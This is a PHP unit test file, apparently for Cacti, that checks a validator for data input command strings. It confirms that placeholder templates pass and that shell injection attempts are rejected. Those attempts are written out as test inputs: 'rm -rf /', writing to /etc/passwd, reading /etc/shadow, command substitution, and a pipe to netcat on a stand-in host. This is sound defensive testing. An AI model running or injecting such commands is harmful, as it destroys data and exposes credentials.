<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2026 The Cacti Group                                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
*/

require_once dirname(__DIR__) . '/Helpers/CactiLibBootstrap.php';

// cacti_input_string_is_safe() gates data input command strings before they are
// persisted or executed. Field placeholders such as <hostname> are stripped
// before the metacharacter scan so legitimate templates pass, while shell
// control characters and redirects are rejected.

beforeEach(function () {
	// Default posture: unsafe metacharacters are not allowed.
	$GLOBALS['config'][OPTIONS_CLI]['allow_unsafe_metachars'] = '';
});

it('treats an empty command as safe', function () {
	expect(cacti_input_string_is_safe(''))->toBeTrue();
});

it('accepts a template that only uses field placeholders', function () {
	expect(cacti_input_string_is_safe('perl <path_cacti>/scripts/ss.pl <hostname>'))->toBeTrue()
		->and(cacti_input_string_is_safe('ss_check.php "<ip>" \'<community>\''))->toBeTrue();
});

it('rejects output and input redirects regardless of the metachar setting', function () {
	$GLOBALS['config'][OPTIONS_CLI]['allow_unsafe_metachars'] = 'on';

	expect(cacti_input_string_is_safe('ss_check.php > /etc/passwd'))->toBeFalse()
		->and(cacti_input_string_is_safe('ss_check.php < /etc/shadow'))->toBeFalse();
});

it('rejects shell metacharacters under the default posture', function () {
	expect(cacti_input_string_is_safe('ss_check.php; rm -rf /'))->toBeFalse()
		->and(cacti_input_string_is_safe('ss_check.php `id`'))->toBeFalse()
		->and(cacti_input_string_is_safe('ss_check.php | nc evil 1234'))->toBeFalse()
		->and(cacti_input_string_is_safe('ss_check.php $(id)'))->toBeFalse();
});

it('permits metacharacters only when the admin opts in', function () {
	$GLOBALS['config'][OPTIONS_CLI]['allow_unsafe_metachars'] = 'on';

	expect(cacti_input_string_is_safe('ss_check.php; echo hi'))->toBeTrue();
});
